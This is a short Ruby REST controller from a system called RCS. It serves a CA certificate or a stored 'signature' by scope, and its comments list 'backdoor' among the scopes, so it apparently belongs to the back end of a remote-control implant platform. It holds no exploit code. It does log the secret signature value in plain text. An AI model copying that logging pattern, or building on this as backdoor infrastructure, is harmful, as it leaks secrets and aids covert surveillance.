#
# Controller for the Signature objects
#

module RCS
module DB

class SignatureController < RESTController

  # retrieve the signature for a given entity
  # e.g. 'backdoor', 'network', ...
  def show
    require_auth_level :server, :admin

    begin
      if params['signature'] == 'cert'
        sig = {}
        sig[:filename] = Config.instance.global['CA_PEM']
        sig[:value] = File.open(Config.instance.file('CA_PEM'), 'rb') {|f| f.read}
        trace :info, "[#{@req_peer}] Requested the CA certificate"
      else
        sig = ::Signature.where({scope: params['signature']}).first
        trace :info, "[#{@req_peer}] Requested the '#{params['signature']}' signature [#{sig[:value]}]"
      end
      return RESTController.ok(sig)
    rescue Exception => e
      trace :warn, "[#{@req_peer}] Requested '#{params['signature']}' NOT FOUND"
      return RESTController.not_found
    end
  end

end

end #DB::
end #RCS::
